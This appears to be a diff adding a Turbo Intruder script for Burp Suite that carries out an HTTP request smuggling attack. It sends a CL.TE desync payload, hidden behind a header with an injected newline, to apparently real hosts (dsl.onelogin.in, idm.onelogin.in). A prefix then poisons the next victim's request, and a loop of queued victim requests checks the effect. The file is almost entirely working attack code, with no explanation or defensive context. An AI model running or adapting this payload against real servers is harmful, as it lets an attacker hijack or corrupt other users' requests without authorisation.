@@ -1,0 +1,35 @@
+req = '''POST / HTTP/1.1
+Host: dsl.onelogin.in
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 5
+Foo: bar\x0ATransfer-Encoding: chunked
+
+0
+
+'''
+def queueRequests(target, wordlists):
+    # to use Burp's HTTP stack for upstream proxy rules etc, use engine=Engine.BURP
+    engine = RequestEngine(endpoint='http://idm.onelogin.in',
+                           concurrentConnections=9,
+                           requestsPerConnection=2,
+                           resumeSSL=False,
+                           timeout=10,
+                           pipeline=False,
+                           maxRetriesPerRequest=0,
+                           engine=Engine.THREADED,
+                           )
+    # This will prefix the victim's request. Edit it to achieve the desired effect.
+    prefix = '''GET /robots HTTP/1.1
+Host: idm.onelogin.in
+X-Ignore: X'''
+    # The request engine will auto-fix the content-length for us
+    attack = req + prefix
+    engine.queue(attack)
+    victim = req
+    for i in range(14):
+        engine.queue(victim)
+        time.sleep(0.5)
+def handleResponse(req, interesting):
+    table.add(req)
+
